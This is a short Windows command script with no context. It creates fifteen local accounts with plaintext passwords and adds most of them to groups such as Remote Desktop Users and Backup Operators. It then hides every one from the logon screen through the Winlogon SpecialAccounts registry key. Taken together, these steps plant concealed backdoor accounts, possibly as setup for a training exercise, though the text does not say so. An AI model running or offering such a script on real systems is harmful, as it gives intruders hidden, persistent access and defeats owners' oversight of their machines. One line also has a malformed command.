net user jinx_zap B00mBox7x /ADD
net user yasuo_wind sw1ftgale2 /ADD
net user jett_dash DraftPeek9 /ADD
net user sova_arrow r3conping4 /ADD
net user ahri_charm f0xfire99 /ADD
net user sage_wall H3alBarrier1 /ADD
net user leesin_kick insec1ck7 /ADD
net user reyna_dismiss s0ulorb3x /ADD
net user infernus_flame burn1tdwn5 /ADD
net user vindicta_hawk sn1perowl2 /ADD
net user lash_whip gr4ppl3pull/ADD
net user haze_smoke sm0kescreen7 /ADD
net user abrams_bear Ch4rgeclaw9 /ADD
net user paradox_time l00preset3 /ADD
net user mcginnis_turret b0xwall4x /ADD

net localgroup "Backup Operators" jinx_zap /ADD
net localgroup "Certificate Service DCOM Access" yasuo_wind /ADD
net localgroup "Cryptographic Operators" jett_dash /ADD
net localgroup "Distributed COM Users" sova_arrow /ADD
net localgroup "Event Log Readers" ahri_charm /ADD
net localgroup "Guests" sage_wall /ADD
net localgroup "IIS_IUSRS" leesin_kick /ADD
net localgroup "Network Configuration Operators" reyna_dismiss /ADD
net localgroup "Performance Log Users" infernus_flame /ADD
net localgroup "Performance Monitor Users" vindicta_hawk /ADD
net localgroup "Power Users" lash_whip /ADD
net localgroup "Print Operators" haze_smoke /ADD
net localgroup "Remote Desktop Users" abrams_bear /ADD
net localgroup "Replicator" paradox_time /ADD

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v jinx_zap /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v yasuo_wind /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v jett_dash /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v sova_arrow /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v ahri_charm /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v sage_wall /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v leesin_kick /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v reyna_dismiss /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v infernus_flame /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v vindicta_hawk /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v lash_whip /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v haze_smoke /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v abrams_bear /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v paradox_time /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v mcginnis_turret /t REG_DWORD /d 0 /f